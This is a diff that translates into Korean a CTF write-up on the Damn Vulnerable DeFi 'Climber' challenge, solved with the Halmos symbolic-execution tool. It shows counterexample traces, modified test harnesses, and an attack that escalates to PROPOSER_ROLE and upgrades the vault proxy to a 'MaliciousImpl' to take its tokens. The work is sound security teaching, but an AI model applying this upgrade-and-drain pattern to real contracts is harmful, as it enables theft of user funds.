+그러나 두 번째 반례를 고려할 때 이 모든 문제가 해결될 것이므로 긴장을 풀 수 있습니다. 우리는 다음 줄에 관심이 있습니다:
 ```javascript
 ...
 halmos_attacker_fallback_bytes_bytes_303e2ea_138 = 0xfe96ffd0...00
@@ -842,34 +853,35 @@ halmos_selector_bytes4_8a4ebe8_142 = schedule
 halmos_selector_bytes4_9c02733_02 = execute
 halmos_selector_bytes4_9e9a490_92 = updateDelay
 ```
-Essentially, this is the same bug but with different scenario. This time we give the `PROPOSER_ROLE` role not to `timelock`, but to the **SymbolicAttacker**, which, by calling its symbolic `fallback()`, registers this `operation`. In this scenario, we avoid the problem of not being able to create such calldata. So, this is a perfectly valid bug mechanism. Additionally, we now know the way for granting `PROPOSER_ROLE` rights to the **SymbolicAttacker**.
+본질적으로 이것은 시나리오가 다른 동일한 버그입니다. 이번에는 `PROPOSER_ROLE` 역할을 `timelock`이 아니라 **SymbolicAttacker**에게 부여하고, **SymbolicAttacker**는 심볼릭 `fallback()`을 호출하여 이 `operation`을 등록합니다. 이 시나리오에서는 그러한 calldata를 생성할 수 없는 문제를 피할 수 있습니다. 따라서 이것은 완벽하게 유효한 버그 메커니즘입니다. 또한, 이제 우리는 **SymbolicAttacker**에게 `PROPOSER_ROLE` 권한을 부여하는 방법을 알고 있습니다.
 
-And what about a counterexample using the `padding` approach? This is essentially the same scenario we just looked at. It presents exactly the same calls. 
+그리고 `padding` 접근 방식을 사용한 반례는 어떻습니까? 이것은 기본적으로 방금 살펴본 것과 동일한 시나리오입니다. 정확히 동일한 호출을 보여줍니다.
 
-Time to compare the 2 approaches:
-1. Intuitiveness:
-    Using the `padding` method looks much better from an intuitive point of view: we don't change the implementation of key functions, it's easier to explain what we're doing.
-2. Fake counterexamples:
-    Using the `padding` method does not simplify validation, so it did not lead to the appearence of a fake counterexample. This is a big plus for preserving the "academicity" of the symbolic test, which already suffers greatly from the changes caused by the symbolic offset error.
-3. Speed:
-    But here the clear favorite is the simplified `id` approach. The speed of executing such a symbolic test, compared to processing long calldata, constantly calculating padding, etc. was on average 60% faster on my machine. And, accordingly, valid counterexamples began to appear much earlier.
+두 접근 방식을 비교할 때입니다:
+1. 직관성:
+    `padding` 방법을 사용하는 것이 직관적인 관점에서는 훨씬 더 좋아 보입니다: 우리는 주요 함수의 구현을 변경하지 않으며, 우리가 무엇을 하고 있는지 설명하기가 더 쉽습니다.
+2. 가짜 반례:
+    `padding` 방법을 사용하면 유효성 검사를 단순화하지 않으므로 가짜 반례가 나타나지 않았습니다. 이것은 이미 심볼릭 오프셋 오류로 인한 변경으로 인해 큰 고통을 겪고 있는 심볼릭 테스트의 "학문성"을 보존하는 데 큰 장점입니다.
+3. 속도:
+    하지만 여기서 확실한 승자는 단순화된 `id` 접근 방식입니다. 긴 calldata 처리, 패딩 지속적 계산 등과 비교하여 그러한 심볼릭 테스트를 실행하는 속도는 제 머신에서 평균 60% 더 빨랐습니다. 그리고 그에 따라 유효한 반례가 훨씬 더 일찍 나타나기 시작했습니다.
 
-What can we conclude here? If you are willing to put up with the fact that your symbolic test looks a bit "hacky" and you must manually filter out fake counterexamples for the sake of speed and performance: you can simplify validation in your tests. If not, it's better to find a more "clean" approach.
-### keccak256 map key handling
-Before moving on to the next step, it is worth saying a few words about how Halmos handled cryptography here in the context of symbolic analysis. The thing is, after the weak handling of cryptography in [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster#counterexamples-analysis) and [The-rewarder](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/the-rewarder#dealing-with-merkle-functions), I got the impression that when working with Halmos, cryptography should be avoided **AT ALL**. But this challenge made me change my mind a bit, because Halmos did something non-trivial here.
+여기서 무엇을 결론지을 수 있을까요? 심볼릭 테스트가 약간 "해킹적"으로 보이고 속도와 성능을 위해 가짜 반례를 수동으로 필터링해야 한다는 사실을 감내할 의향이 있다면: 테스트에서 유효성 검사를 단순화할 수 있습니다. 그렇지 않다면 더 "깨끗한" 접근 방식을 찾는 것이 좋습니다.
 
-In `schedule()`, `operations` are stored by bytes32 key (`id`):
+### keccak256 맵 키 처리
+다음 단계로 넘어가기 전에, 심볼릭 분석의 맥락에서 Halmos가 여기서 암호화를 어떻게 처리했는지에 대해 몇 마디 할 가치가 있습니다. 사실 [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster#counterexamples-analysis)와 [The-rewarder](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/the-rewarder#dealing-with-merkle-functions)에서 암호화에 대한 약한 처리를 본 후, Halmos로 작업할 때 암호화를 **전혀** 피해야 한다는 인상을 받았습니다. 하지만 이 챌린지는 Halmos가 여기서 꽤 중요한 일을 해냈기 때문에 제 생각을 조금 바꾸게 만들었습니다.
+
+`schedule()`에서 `operations`는 bytes32 키 (`id`)로 저장됩니다:
 ```solidity
 operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;
 operations[id].known = true;
 ```
-This `id` is essentially a **keccak256** hash of some complex symbolic value (this hash also behaves like a symbolic value):
+이 `id`는 본질적으로 어떤 복잡한 심볼릭 값의 **keccak256** 해시입니다(이 해시 또한 심볼릭 값처럼 동작합니다):
 ```javascript
 f_sha3_4096(Concat(...,halmos_schedule_salt_bytes32_8b37382_249, ...))
 ```
-That is, the `operation` was saved using this symbolic key.
+즉, `operation`은 이 심볼릭 키를 사용하여 저장되었습니다.
 
-Next, in `execute()`, we have another `id`, constructed in a similar way:
+다음으로, `execute()`에서 우리는 비슷한 방식으로 구성된 또 다른 `id`를 가지고 있습니다:
 ```solidity
 function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
 {
@@ -882,25 +894,25 @@ function execute(address[] calldata targets, uint256[] calldata values, bytes[] 
     operations[id].executed = true;
 }
 ```
-This time the id looks a little different, but with the same structure:
+이번에는 id가 조금 다르게 보이지만 동일한 구조를 가집니다:
 ```javascript
 f_sha3_4096(Concat(...,halmos_execute_salt_bytes32_ae9ed2c_76, ...))
 ```
-In order to correctly find a counterexample, you need to:
-1. Assume that the key returned in `execute()` may be equal to the key by which the data was saved in `schedule()`: 
+반례를 올바르게 찾으려면 다음을 수행해야 합니다:
+1. `execute()`에서 반환된 키가 `schedule()`에서 데이터가 저장된 키와 같을 수 있다고 가정합니다:
     `sha3(complex_sym_val1) == sha3(complex_sym_val2)`
-2. Assume that if 2 hashes are the same, then the symbolic values behind them are also the same:
+2. 2개의 해시가 같다면 그 뒤에 있는 심볼릭 값도 동일하다고 가정합니다:
     `(sha3(complex_sym_val1) == sha3(complex_sym_val2)) ==> (complex_sym_val1 == complex_sym_val2)`
-    This is non-trivial behavior. This requires support at the engine level, and Halmos implements this logic! Otherwise, we would have to deal with constant fake hash collisions or not finding counterexamples at all.
+    이것은 쉽지 않은 동작입니다. 이것은 엔진 수준에서의 지원이 필요하며, Halmos는 이 로직을 구현합니다! 그렇지 않다면 우리는 지속적인 가짜 해시 충돌을 처리하거나 반례를 전혀 찾지 못하는 문제를 겪어야 했을 것입니다.
 
-We can get a complete list of such implemented heuristics by analyzing the regression tests in the Halmos repository. For example, there are tests about:
+Halmos 리포지토리의 회귀 테스트를 분석하여 구현된 휴리스틱의 전체 목록을 얻을 수 있습니다. 예를 들어 다음에 대한 테스트가 있습니다:
 1. [keccak256()](https://github.com/a16z/halmos/blob/5c5ca39a1ee943ad8c8dc2fe042bdea44413ed69/tests/regression/test/Sha3.t.sol#L7)
 2. [Signatures/ecrecover](https://github.com/a16z/halmos/blob/5c5ca39a1ee943ad8c8dc2fe042bdea44413ed69/tests/regression/test/Signature.t.sol)
 
-and other. 
+등등.
 
-## preload implementation
-We will add a preload (like in [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#symbolicattacker-preload)) to unlock a `PROPOSER_ROLE` privilege and test new scenarios.
+## preload 구현
+우리는 `PROPOSER_ROLE` 권한을 잠금 해제하고 새로운 시나리오를 테스트하기 위해 preload([selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#symbolicattacker-preload)에서처럼)를 추가할 것입니다.
 ```solidity
 function check_climber() public checkSolvedByPlayer {
     ...
@@ -989,7 +1001,7 @@ contract ClimberTimelock is ClimberTimelockBase, FoundryCheats, HalmosCheats {
         is_preload = false;
     }
 ```
-Now, given that we have the rights to execute any call on behalf of `timelock` (and even `delay` is `0` now), let's simplify the task for the solver a little and remove the check for the presence of an operation in the schedule:
+이제 `timelock`을 대신하여 어떤 호출이든 실행할 수 있는 권한이 있으므로(심지어 `delay`도 `0`입니다), 솔버의 작업을 조금 단순화하고 스케줄에 작업이 있는지 확인하는 부분을 제거해 보겠습니다:
 ```solidity
 /*
 * The special version of execute() to use by SymbolicAttacker with escalated privileges.
@@ -1039,7 +1051,7 @@ function execute(address[] calldata targets, uint256[] calldata values, bytes[] 
     //operations[id].executed = true;
 }
 ```
-And, of course, we will remove the invariant to check the immutability of `PROPOSER_ROLE`, otherwice every transaction will be a counterexample now :D
+그리고 물론, `PROPOSER_ROLE`의 불변성을 확인하는 불변 조건을 제거할 것입니다. 그렇지 않으면 모든 트랜잭션이 반례가 될 것입니다 :D
 ```solidity
 // Check timelock roles immutability
 /*
@@ -1048,8 +1060,9 @@ vm.assume(symbolicProposer != proposer);
 assert(!timelock.hasRole(PROPOSER_ROLE, symbolicProposer));
 */
 ```
-## Counterexample analysis (v2)
-Let's see if we can now break some other invariant:
+
+## 반례 분석 (v2)
+이제 다른 불변 조건을 깰 수 있는지 확인해 봅시다:
 ```javascript
 halmos --solver-timeout-assertion 0 --function check_climber --loop 100  --default-array-lengths 1 --solver-timeout-branching 0
 ...
@@ -1061,7 +1074,7 @@ halmos_is_implementation_bool_40ddd50_40 = 0x01
 halmos_selector_bytes4_36049ca_02 = execute
 halmos_selector_bytes4_95bf4f7_39 = upgradeToAndCall
 halmos_symbolicSpender_address_2f0913e_54 = 0x0000000000000000000000000000000000000000
-p_dataElements[0]_bytes_e41f222_10 = 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+p_dataElements[0]_bytes_e41f222_10 = 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
 p_dataElements[0]_length_eb3fe30_11 = 0x0000000000000000000000000000000000000000000000000000000000000064
 p_dataElements_length_4ea5857_09 = 0x0000000000000000000000000000000000000000000000000000000000000001
 p_data_bytes_2c011eb_49 = 0xf2fde38b00000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
@@ -1073,8 +1086,9 @@ p_targets_length_c542a8b_05 = 0x000000000000000000000000000000000000000000000000
 p_values[0]_uint256_1f68feb_08 = 0x0000000000000000000000000000000000000000000000000000000000000000
 p_values_length_7d0d274_07 = 0x0000000000000000000000000000000000000000000000000000000000000001
 ```
-Great! Now we know how to change the `vault` implementation. Just call `upgradeToAndCall()` on behalf of `timelock`. In fact, at this point the attack scenario became obvious: if we can replace the `vault` **implementation**, then we can do literally anything with its assets, including sending its tokens anywhere. Challenge solved!
-## Attack implementation
+훌륭합니다! 이제 `vault` 구현을 변경하는 방법을 알았습니다. `timelock`을 대신하여 `upgradeToAndCall()`을 호출하기만 하면 됩니다. 사실 이 시점에서 공격 시나리오는 명백해졌습니다: 만약 우리가 `vault` **구현**을 교체할 수 있다면, 우리는 그 자산을 말 그대로 무엇이든 할 수 있으며, 토큰을 어디로든 보낼 수 있습니다. 챌린지 해결!
+
+## 공격 구현
 **Climber.t.sol**:
 ```solidity
 function test_climber() public checkSolvedByPlayer {
@@ -1181,17 +1195,18 @@ contract MaliciousImpl is UUPSUpgradeable{
     fallback() external payable {}
 }
 ```
-Run:
+실행:
 ```javascript
 forge test --mp test/climber/Climber.t.sol
 ...
 Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.63ms (438.35µs CPU time)
 ```
-Passed!
-## Conclusions
-1. It is important to consider the specifics of contracts during symbolic analysis. For example, the UUPS proxy implements 2 interfaces at once, which forced us to slightly change the logic of symbolic traversal of the setup.
-2. When you need to compare 2 bytes arrays symbolically - you need to be VERY CAREFUL. It is possible for two arrays to encode the same transaction but have different hashes because they have different lengths.
-3. Simplifying validation can be very effective for finding bugs, or at least it can help find buggy patterns. Yes, we may encounter fake counterexamples, but if that's the price to find a real one, it may be worth paying.
-4. In this challenge, we again managed to "cut" the problem and "eat it in smaller pieces": first we found the privilege escalation, then the mechanism for changing the proxy implementation having these rights. However, the privilege escalation bug is atomic, indivisible in nature. Halmos also coped with it, but had to significantly expand the number of symbolic calls in the operation and wait many hours until something was found.
-5. The symbolic `fallback()` functionality for **SymbolicAttacker** turned out to be necessary to solve this challenge. This functionality should be useful for future challenges!
-6. Halmos has some effective techniques for working with cryptographic functions. It is worth understanding what Halmos can and cannot do, so that you can better predict its scope of capabilities for the current test, and, on the other hand, so that the results do not seem like "magic" :D
+통과!
+
+## 결론
+1. 심볼릭 분석 중에 계약의 세부 사항을 고려하는 것이 중요합니다. 예를 들어, UUPS 프록시는 2개의 인터페이스를 동시에 구현하므로 설정의 심볼릭 순회 로직을 약간 변경해야 했습니다.
+2. 2개의 바이트 배열을 심볼릭하게 비교해야 할 때 - **매우 주의**해야 합니다. 두 배열이 동일한 트랜잭션을 인코딩하지만 길이가 다르기 때문에 해시가 다를 수 있습니다.
+3. 검증을 단순화하는 것은 버그를 찾는 데 매우 효과적일 수 있으며, 적어도 버그 패턴을 찾는 데 도움이 될 수 있습니다. 예, 우리는 가짜 반례를 만날 수 있지만, 그것이 실제 반례를 찾기 위한 대가라면 지불할 가치가 있을 수 있습니다.
+4. 이 챌린지에서 우리는 다시 문제를 "잘라내어" "작은 조각으로 먹는" 데 성공했습니다: 먼저 권한 상승을 찾은 다음, 이러한 권한을 가지고 프록시 구현을 변경하는 메커니즘을 찾았습니다. 그러나 권한 상승 버그는 원자적이며 본질적으로 나눌 수 없습니다. Halmos는 이것에도 대처했어지만, 작업에서 심볼릭 호출 수를 크게 확장하고 무언가가 발견될 때까지 몇 시간을 기다려야 했습니다.
+5. **SymbolicAttacker**에 대한 심볼릭 `fallback()` 기능은 이 챌린지를 해결하는 데 필요한 것으로 판명되었습니다. 이 기능은 향후 챌린지에도 유용할 것입니다!
+6. Halmos는 암호화 기능을 다루는 몇 가지 효과적인 기술을 가지고 있습니다. Halmos가 할 수 있는 것과 할 수 없는 것을 이해하여 현재 테스트에 대한 기능 범위를 더 잘 예측하고, 다른 한편으로는 결과가 "마법"처럼 보이지 않도록 하는 것이 좋습니다 :D
